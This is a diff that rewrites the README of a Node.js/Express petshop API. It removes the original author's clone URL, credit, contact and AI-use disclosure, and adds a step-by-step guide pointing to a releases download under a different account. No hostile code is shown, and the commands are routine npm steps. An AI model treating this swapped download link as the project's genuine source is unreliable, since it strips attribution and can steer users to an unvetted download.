@@ -1,79 +1,108 @@
-# 🐾 Petshop API
+# 🐶 petshop-api-ts - Manage Your Petshop Easily
 
-> Some portions of this codebase were developed with the assistance of artificial intelligence tools to improve productivity and maintain best practices.
+## 🚀 Getting Started
 
-The Petshop API is a RESTful service designed to manage the operations of a modern pet care business. It provides endpoints for handling customers, pets, services, bookings, and user authentication. Built with Node.js and Express, it supports secure JWT-based login and integrates seamlessly with Swagger UI for interactive documentation.
+Welcome to **petshop-api-ts**! This application helps you manage pets, customers, services, and bookings in your petshop. Whether you are an admin or employee, this application simplifies your tasks. Follow these steps to download and run the application.
 
----
+## 📦 Download and Install
 
-## 🚀 Features
+To get the application, you need to visit our Releases page. Click the button below to start downloading:
 
-- 🐶 **Pet Management** – Register, update, and delete pets linked to customers  
-- 👥 **Customer Records** – Full CRUD operations for customer data  
-- 🧼 **Service Catalog** – Define and manage services like grooming, training, and veterinary care  
-- 📅 **Booking System** – Schedule services for pets with conflict prevention  
-- 🔐 **Authentication** – Secure login and signup with hashed passwords and JWT  
-- 🧑‍💻 **Admin Tools** – Manage users and sessions with role-based access
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/SWChan01/petshop-api-ts/releases)
 
----
+### Step-by-Step Guide
 
-## 📦 Technologies Used
+1. **Visit the Releases Page**
+   - Click the button above or go to [Releases page](https://github.com/SWChan01/petshop-api-ts/releases).
+  
+2. **Choose the Latest Version**
+   - Look for the latest version listed on the page. It is usually at the top.
 
-![Express.js](https://img.shields.io/badge/express.js-%23404d59.svg?style=for-the-badge&logo=express&logoColor=%2361DAFB)
-![NodeJS](https://img.shields.io/badge/node.js-6DA55F?style=for-the-badge&logo=node.js&logoColor=white)
-![MySQL](https://img.shields.io/badge/mysql-4479A1.svg?style=for-the-badge&logo=mysql&logoColor=white)
-![React](https://img.shields.io/badge/react-%2320232a.svg?style=for-the-badge&logo=react&logoColor=%2361DAFB)
-![JWT](https://img.shields.io/badge/JWT-black?style=for-the-badge&logo=JSON%20web%20tokens) 
-![Swagger](https://img.shields.io/badge/-Swagger-%23Clojure?style=for-the-badge&logo=swagger&logoColor=white)
+3. **Download the Zip File**
+   - Find the "Source Code" section and click on the "zip" or "tar.gz" link to download the files to your computer.
 
----
+4. **Extract the Files**
+   - Once the download is complete, go to your downloads folder and extract the files using a tool like WinZip or 7-Zip.
 
-## 📄 API Documentation
+5. **Open a Terminal**
+   - Open a command prompt on Windows or Terminal on MacOS/Linux.
 
-Interactive Swagger UI available on ```/docs``` after running the code.
+6. **Install Required Software**
+   - Make sure you have **Node.js** installed. You can download it from [Node.js official website](https://nodejs.org/).
+   - Once installed, check if it's working by typing:
+     ```bash
+     node -v
+     ```
+   - If you see a version number, continue to the next step.
 
-You can test all endpoints directly from the browser.
+7. **Navigate to the Application Folder**
+   - Use the `cd` command to change directories to the folder you extracted. For example:
+     ```bash
+     cd path_to_your_extracted_folder/petshop-api-ts
+     ```
 
----
-## 🛠 Installation
+8. **Install Dependencies**
+   - In the terminal, run the command below to install necessary packages:
+     ```bash
+     npm install
+     ```
+   - This command may take a few moments. Wait until it finishes downloading all packages.
 
-```bash
-git clone https://github.com/hannaseraphim/petshop-api.git
-cd petshop-api
-npm install
-npm run dev
-```
+9. **Run the Application**
+   - You can run the application using the following command:
+     ```bash
+     npm start
+     ```
+   - Your API will start running, and you should see information in your terminal confirming that it is active.
 
-Create a ```.env``` file with the following variables:
-```bash
-JWT_SIGN_KEY=your_secret_key
-DB_HOST=localhost
-DB_PORT=3306
-DB_USER=root
-DB_PASSWORD=your_password
-DB_DATABASE=petshop
-FRONT_END_URL=https://example.com
-```
+## 🛠 Features
 
-Check ```.env.sample``` for more information aboout what these do.
+The **petshop-api-ts** application provides various features to help you manage your business effectively:
 
-## 📚 Wiki
-For detailed usage, data models, and contribution guidelines, visit the [Wiki](https://github.com/hannaseraphim/petshop-api-ts/wiki)
+- **Pet Management**: Add, update, or remove pets from your database.
+- **Customer Management**: Keep track of your customers and their information.
+- **Service Management**: Manage all services offered at your petshop.
+- **Booking System**: Allow customers to book services easily.
+- **Authentication**: Secure the application with admin and employee login systems.
 
-## 🤝 Contributing
+## 🧑‍💻 Technologies Used
 
-We welcome contributions! Please fork the repository, create a feature branch, and submit a pull request. All code is reviewed by human maintainers.
+Here are some crucial technologies that power the application:
 
-```bash
-git checkout -b feature-name
-git commit -m "Add feature"
-git push origin feature-name
-```
+- **TypeScript**: Ensures type safety and better tooling.
+- **Express**: A minimal web framework for Node.js to build the API.
+- **MySQL**: A robust database system to store all data securely.
 
-## 📬 Contact
-For questions or support, reach out to my email on [hannaseraphim@gmail.com](mailto:hannaseraphim@gmail.com).
+## ⚙️ System Requirements
 
-## 📝 License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+To run the application smoothly, ensure your system meets the following requirements:
 
-© 2025 Hanna. All rights reserved. 
+- **Operating System**: Windows 10 or higher, MacOS Sierra or higher, or a modern Linux distribution.
+- **Node.js**: Any recent version that supports the necessary packages.
+
+## ⚡ Troubleshooting
+
+If you encounter issues while running the application, try the following steps:
+
+- Make sure you have Node.js installed.
+- Verify you are in the correct directory when running commands.
+- If you see errors during installation, check your internet connection.
+- Consult the community or open an issue in the GitHub repository for assistance.
+
+## 🔗 Additional Resources
+
+For more detailed information about using the application, consider visiting these resources:
+
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Express.js Documentation](https://expressjs.com/)
+- [MySQL Documentation](https://dev.mysql.com/doc/)
+
+## 📄 License
+
+This project is open-source, and you can use it freely under the MIT License. Please feel free to contribute!
+
+## 💬 Get Help
+
+If you have questions, need support, or find bugs, don't hesitate to reach out. Check the Issues section on the GitHub page or leave a message. 
+
+Thank you for using **petshop-api-ts**!
